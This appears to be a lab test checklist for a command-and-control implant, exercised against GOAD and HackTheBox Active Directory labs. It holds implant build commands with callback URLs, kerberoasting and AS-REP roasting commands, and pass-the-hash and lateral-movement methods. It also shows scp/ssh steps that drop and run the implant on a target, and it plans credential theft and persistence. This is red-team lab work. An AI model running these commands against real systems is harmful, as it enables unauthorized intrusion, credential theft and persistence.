# C Implant Lab Checklist (GOAD + HTB)

**Purpose:** Prove AD-complete path on the C implant. No placeholder hashes.  
**Binary:** `make implant-c` / `generate --language c --os windows`  
**CA:** base64 **DER** of teamserver CA (`openssl x509 -in ca.pem -outform DER | base64 -w0`). Empty CA → HTTPS posts fail closed.

---

## 0. Build smoke (operator host)

C implant HTTPS pin is **base64 DER** of the teamserver CA (not base64 of the PEM file).  
Pass `CA_CERT_PATH` and the Makefile converts PEM→DER→b64 automatically.

```bash
make -C cimplant test-host

# Prefer CA_CERT_PATH (auto DER). Fails closed if CA/ID/secret empty for HTTPS.
make implant-c \
  CALLBACK_URL=https://<C2>:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500 JITTER_PCT=10
# → build/implant_c.exe

make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500 JITTER_PCT=10
# → build/implant_c_linux
```

**Beacon timing:** C implant uses **unique Unix-ms** HMAC timestamps (`erebus_unique_unix_ms`) so `SLEEP_MS=500` bursts do not collide with the server replay cache. Prefer ≥500 ms for lab; ≥1 s on flaky links.

**WinRM PTH:** `ntlm_hash` = 32-hex NT or `LM:NT`. Failures return `pth_layer=<layer>` (Day-3 gate).  
Go implant hash path: **one flow** (seal if negotiated; no seal→plain retry). Sequential `lateral winrm --hash` reuses the NTLM session (1 handshake + N commands). Live pypsrp parity still eng-verify.  
**Auth drops:** teamserver logs `unknown_implant|hmac|skew|replay|parse|io` — see `docs/OPERATOR_INBOUND.md`.

- [ ] Host unit tests green (`pathjail`, `pb-copy`, `kerberoast-pb`, `ntlm-parse`)  
- [ ] PE / Linux peer builds without error  
- [ ] Empty `CA_CERT_PATH` + HTTPS → make errors (fail closed)  

---

## 1. Session smoke (lab Windows host)

| Step | Command / check | Pass? |
|------|-----------------|-------|
| Register | implant runs; `sessions` shows host | |
| Beacon | `shell whoami` | |
| Files | path jail rejects `..` | |
| CA | wrong/empty CA does **not** silently succeed | |

---

## 2. Kerberoast verify (Phase 0 gate)

**GOAD** and **HTB AD** both.

```text
ldap-enum kerberoastable --domain <DOMAIN> --dc <DC>
# approve if gated
kerberoast --domain <DOMAIN> --dc <DC> --user <u> --pass <p>
loot
```

| Check | Pass? |
|-------|-------|
| LDAP returns SPNs | |
| Hashes look like `$krb5tgs$23$…` or `$krb5tgs$17|18$…` | |
| Offline crack or known-lab password confirms | |
| Bad password → clear failure (no fake hash) | |

**Code status (2026-08-07):** real AS-REQ → TGS → hashcat lines; empty SPN list → empty result (no placeholders); operator-facing error strings on bind/AS fail.  

**Lab status:** _fill after run_ — verified on: [ ] GOAD  [ ] HTB  

---

## 3. Golden Demo 5/5 Auto (C only)

Frozen objective: recon → LDAP kerberoastable → kerberoast → summarize.  
No LSASS / persist / lateral.

| Run | Result | Notes |
|-----|--------|-------|
| 1 | | |
| 2 | | |
| 3 | | |
| 4 | | |
| 5 | | |

- [ ] 5 consecutive Auto runs logged  

---

## 4. AS-REP roast

```text
asreproast --domain <DOMAIN> --dc <DC> --user <optional>
# or list users without pre-auth; empty list enumerates via LDAP (anon may fail)
```

| Check | Pass? |
|-------|-------|
| `$krb5asrep$23$…` or AES form | |
| Non-roastable user skipped / no fake hash | |
| Prefer explicit `--user` if LDAP anon denied | |

---

## 5. Lateral (after AD)

| Method | How | Lab proof | Pass? |
|--------|-----|-----------|-------|
| WinRM password | WSMan Negotiate | | |
| WinRM PTH | `ntlm_hash` (32 hex NT or LM:NT), no password | | |
| PsExec | password + **payload** bytes → ADMIN$ + service | | |
| WMI | COM `Win32_Process.Create` (password) | | |
| DCOM | MMC20 `ExecuteShellCommand` (password) | | |

Notes:
- PsExec hash-only is **not** supported (WNet); use WinRM PTH.
- WMI/DCOM hash-only: use WinRM PTH instead.

---

## 6. Linux C peer — baseline gate (Sprint L / M4a)

**Default Linux implant is C** (`make implant-c-linux` / `generate --language c --os linux`).  
Plan: `docs/plans/SPRINT_L_C_LINUX.md` · Sign-off: `reports/htb-c-linux-peer/SIGN_OFF.md`

```bash
# Host smoke (build + unit tests; no HTB required)
./scripts/c_linux_e2e_smoke.sh

# Or manual build (CA_CERT_PATH auto PEM→DER):
make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500
```

### Firewalled HTB (no route to operator VPN)

Many boxes (FireFlow, DarkZeroReturns) block outbound to `tun0`. Use reverse tunnel:

```bash
# Operator: teamserver HTTPS :8443
./scripts/htb_reverse_tunnel.sh user@TARGET_IP
# Target implant must be built with CALLBACK_URL=https://127.0.0.1:8443
scp build/implant_c_linux user@TARGET:/tmp/
ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
```

| Check | Pass? |
|-------|-------|
| Host unit tests + build (`c_linux_e2e_smoke.sh`) | **PASS** 2026-08-09 |
| Empty CA HTTPS build fails closed | **PASS** 2026-08-09 |
| Register + shell (local or tunnel) | Open — live eng |
| File / process / ifconfig | Open — live eng |
| Unsupported tasks (socks, kerberoast) return **explicit** errors | Open — live eng (stubs present) |
| SOCKS / localhost pivot | **Code landed** (async OPEN, 8s dial timeout, gen FD, `[ipv6]:port`); live lab proof open |

**Pivot policy:** Prefer C Linux for shell/files/net. Reverse SOCKS over beacon is **implemented** (`socks start` on Linux C session); prove live (M4c eng gate). Fallback: `scripts/htb_reverse_tunnel.sh` / Ligolo.

### Habit (every Linux HTB)

- [ ] Build/drop **C** implant first (not Go)
- [ ] Exercise shell + at least one of file/process/net
- [ ] If Go used: one-line reason in report
- [ ] Gap table for missing post-ex → Sprint L backlog

---

## 7. Linux C deep post-ex (Sprint L / M4c–f)

| Check | Pass? |
|-------|-------|
| Reverse SOCKS over beacon (`socks start`) | Code **PASS** host tests 2026-08-09; live eng open |
| Creds MVP (`ssh_keys` / `history` / `env`) | |
| Persist MVP (cron / systemd_user / bashrc) | |
| Privesc `enum` (sudo/SUID/caps) | |

---

## Sign-off

| Milestone | Owner | Date |
|-----------|-------|------|
| V0 Kerberoast | | |
| M0 Golden Demo | | |
| M3 AS-REP + AES | | |
| M2 Lateral | | |
| **M4a Linux C host baseline** | | **2026-08-09** (host smoke) |
| M4a live local + HTB | | open |
| M4c reverse SOCKS | | open |
